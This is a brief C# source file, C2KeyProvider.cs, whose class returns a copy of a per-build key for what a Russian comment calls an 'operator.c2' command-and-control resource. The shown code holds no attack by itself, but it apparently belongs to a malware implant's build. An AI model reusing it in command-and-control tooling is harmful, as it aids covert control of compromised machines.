// language: C#, file: ns0/C2KeyProvider.cs, runtime: .NET Framework 4.8, no NuGet
// Ключ C2-ресурса (operator.c2). Per-build: из BuildSecrets.
using System;

namespace ns0
{
    internal static class C2KeyProvider
    {
        private static readonly byte[] Key = BuildSecrets.C2Key;

        public static byte[] GetKey()
        {
            byte[] copy = new byte[Key.Length];
            Buffer.BlockCopy(Key, 0, copy, 0, Key.Length);
            return copy;
        }
    }
}